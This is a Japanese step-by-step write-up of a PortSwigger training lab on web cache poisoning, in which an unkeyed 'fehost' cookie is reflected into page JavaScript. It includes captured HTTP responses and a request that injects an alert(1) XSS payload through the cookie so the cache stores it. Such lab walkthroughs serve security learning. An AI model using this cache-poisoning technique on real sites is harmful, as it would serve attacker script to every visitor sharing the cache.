# キーのない Cookie による Web キャッシュ ポイズニング

以下のハッキングラボを実施します  
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie  
このラボは、キャッシュ キーに Cookie が含まれていないため、Web キャッシュ ポイズニング に対して脆弱です。

- 1. BurpSuite を起動して、Proxy タブからブラウザを起動します
- 2. ブラウザからハッキングラボにアクセスします
- 3. 同じ商品ページに 2 回アクセスします
     1 回目

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: fehost=prod-cache-01; Secure; HttpOnly
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 3860
```

2 回目

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 5
X-Cache: hit
Content-Length: 3860
```

- 4.レスポンスを確認すると fehost の値が javascript オブジェクトに反映されています

```html
<script>
  data = {
    host: "0aba009e03b576ae8150caa5003400ad.web-security-academy.net",
    path: "/product",
    frontend: "prod-cache-01",
  };
</script>
```

- 5. repeter に送ったリクエストにキャッシュバスター クエリ パラメーターを追加します

```
GET /?cb=1234 HTTP/2
```

送信すると javascript オブジェクトの frontend の値は保持されたままです

```html
<script>
  data = {
    host: "0aba009e03b576ae8150caa5003400ad.web-security-academy.net",
    path: "/",
    frontend: "prod-cache-01",
  };
</script>
```

- 6. 以下のように fehost にスクリプトを送信して、キャッシュさせます

```
GET / HTTP/2
Host: 0aba009e03b576ae8150caa5003400ad.web-security-academy.net
Cookie: session=yQYjZtbE7JR1UQ3EdCHptH5g83scSwTV; fehost=prod-cache-01"-alert(1)-"someString
```

- 7. ホームページでリロードするとスクリプトが実行されます
